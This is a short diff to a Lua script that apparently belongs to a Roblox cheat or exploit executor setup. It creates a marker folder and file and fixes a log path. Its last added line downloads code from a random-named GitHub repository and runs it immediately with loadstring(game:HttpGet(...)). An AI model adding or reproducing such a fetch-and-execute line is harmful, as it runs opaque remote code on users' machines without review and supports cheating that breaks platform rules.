@@ -7,8 +7,13 @@ if isfolder("aloaded") then
     end
 end
 
+if not isfolder("aloaded") then
+    makefolder("aloaded")    
+end
 
-
+if not isfile("aloaded/info.txt") then
+    writefile("aloaded/info.txt", "")    
+end
 
 
 
@@ -87,4 +92,6 @@ end
 
 print("passed check 5")
 print("doing some more little stuff")
-appendfile("aloaded/info", "checked | ")
+appendfile("aloaded/info.txt", "checked | ")
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/nuddaL/wvvwhwbwhwhbahwhwhwwhhbwhhwhbdbadwh/main/syn'))()
